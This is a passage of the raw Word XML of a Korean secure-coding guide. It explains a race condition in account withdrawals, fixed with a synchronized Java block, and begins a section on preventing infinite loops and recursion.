              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>차감</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사이에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>다른</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>스레드가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>동시에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>동일</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계좌에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>출금을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시도하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>두</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>스레드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>모두</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>잔액</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>확인을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>통과한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>뒤</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>각각</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>차감을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수행합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실제</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>잔액보다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>더</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>많은</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>금액이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>출금되는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>마이너스</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>잔액</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>상태가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>발생하며</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>금융</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시스템에서는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실제</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>금전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>손실로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이어집니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>] synchronized</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>임계</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>구역</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>보호</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>synchronized(account) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    if (account.getBalance() &gt;= amount) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        account.deduct(amount);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    }</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>종료되지</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>않는</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>반복문</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>또는</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>재귀함수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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>재귀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호출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시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최대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호출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횟수를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제한하거나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초기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상수값을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설정하여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무한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재귀를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방지한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>종료</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>조건</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
